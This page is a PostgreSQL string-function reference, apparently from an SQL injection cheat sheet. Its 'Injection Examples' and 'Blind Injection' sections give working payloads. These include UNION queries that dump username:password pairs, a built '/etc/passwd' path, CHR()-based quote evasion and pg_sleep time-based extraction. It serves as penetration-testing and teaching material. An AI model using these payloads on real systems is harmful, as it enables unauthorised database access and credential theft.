---
title: String Concatenation
description: Methods for string concatenation in PostgreSQL
category: Injection Techniques
order: 11
tags: ["string operations", "concatenation", "sql functions"]
lastUpdated: 2025-12-07
---

## String Concatenation

String concatenation is essential for constructing complex queries or bypassing filters during SQL injection. PostgreSQL provides several methods to concatenate strings.

### Using || Operator

The primary method for string concatenation in PostgreSQL:

```sql
SELECT 'A' || 'B';
-- Result: 'AB'

SELECT 'Hello' || ' ' || 'World';
-- Result: 'Hello World'
```

### CONCAT() Function

Available in PostgreSQL 9.1+:

```sql
SELECT CONCAT('a', 'b', 'c');
-- Result: 'abc'
```

`CONCAT()` handles NULL values gracefully (skips them):

```sql
SELECT CONCAT('a', NULL, 'c');
-- Result: 'ac'
```

**Note:** The `||` operator returns NULL if any operand is NULL:

```sql
SELECT 'a' || NULL || 'c';
-- Result: NULL
```

### CONCAT_WS() Function

Concatenate with separator (PostgreSQL 9.1+):

```sql
SELECT CONCAT_WS(',', 'a', 'b', 'c');
-- Result: 'a,b,c'

SELECT CONCAT_WS(':', 'user', 'password');
-- Result: 'user:password'
```

### STRING_AGG() Function

Aggregate multiple rows into a single string:

```sql
SELECT STRING_AGG(username, ',') FROM users;
-- Result: 'user1,user2,user3'

-- With ordering
SELECT STRING_AGG(username, ',' ORDER BY username) FROM users;
-- Result: 'admin,guest,user1'
```

### ARRAY_TO_STRING() Function

Convert arrays to strings:

```sql
SELECT ARRAY_TO_STRING(ARRAY['a', 'b', 'c'], ',');
-- Result: 'a,b,c'

SELECT ARRAY_TO_STRING(ARRAY(SELECT username FROM users), ',');
-- Returns all usernames as comma-separated string
```

### Using FORMAT()

PostgreSQL's printf-style formatting:

```sql
SELECT FORMAT('%s:%s', 'username', 'password');
-- Result: 'username:password'

SELECT FORMAT('User: %s (ID: %s)', username, id) FROM users;
```

### Injection Examples

```sql
-- Extracting multiple column values
' UNION SELECT NULL,username||':'||password,NULL FROM users--

-- Using CONCAT
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--

-- Aggregating multiple rows
' UNION SELECT NULL,STRING_AGG(username||':'||password,';'),NULL FROM users--

-- Building file paths
' UNION SELECT NULL,'/etc/'||'passwd',NULL--
```

### Building Strings Without Quotes

Using `CHR()` with concatenation:

```sql
-- Build 'admin' without quotes
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);
-- Result: 'admin'
```

### Type Casting in Concatenation

When concatenating different types:

```sql
-- Cast integer to text
SELECT 'ID: ' || id::text FROM users;

-- Using CAST
SELECT 'ID: ' || CAST(id AS text) FROM users;
```

### String Length and Position Functions

Essential functions for blind SQL injection character extraction:

```sql
-- LENGTH() - Get string length
SELECT LENGTH('admin');
-- Result: 5

SELECT LENGTH(username) FROM users WHERE id=1;
-- Returns length of username

-- CHAR_LENGTH() - Alias for LENGTH
SELECT CHAR_LENGTH('admin');
-- Result: 5

-- OCTET_LENGTH() - Length in bytes (useful for multi-byte)
SELECT OCTET_LENGTH('admin');
-- Result: 5

-- POSITION() - Find substring position
SELECT POSITION('min' IN 'admin');
-- Result: 3

-- STRPOS() - PostgreSQL-specific position function
SELECT STRPOS('admin', 'min');
-- Result: 3
```

### Substring Extraction Functions

```sql
-- SUBSTRING() - Extract portion of string
SELECT SUBSTRING('admin', 1, 1);
-- Result: 'a'

SELECT SUBSTRING('admin' FROM 1 FOR 1);
-- Result: 'a' (SQL-standard syntax)

-- SUBSTR() - Alias for SUBSTRING
SELECT SUBSTR('admin', 1, 1);
-- Result: 'a'

-- LEFT() - Get leftmost characters
SELECT LEFT('admin', 3);
-- Result: 'adm'

-- RIGHT() - Get rightmost characters
SELECT RIGHT('admin', 3);
-- Result: 'min'
```

### Blind Injection with String Functions

```sql
-- Extract string length first
' AND LENGTH((SELECT username FROM users LIMIT 1))=5--

-- Binary search for length
' AND LENGTH((SELECT username FROM users LIMIT 1))>3--

-- Extract character by character
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--

-- Using ASCII for numeric comparison
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>96--

-- Time-based with LENGTH
' AND CASE WHEN LENGTH(current_database())>5 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### Notes

- The `||` operator is SQL-standard and preferred in PostgreSQL
- `CONCAT()` and `CONCAT_WS()` require PostgreSQL 9.1+
- `STRING_AGG()` requires PostgreSQL 9.0+
- Use `COALESCE()` to handle NULLs when using `||`: `COALESCE(col, '') || 'text'`
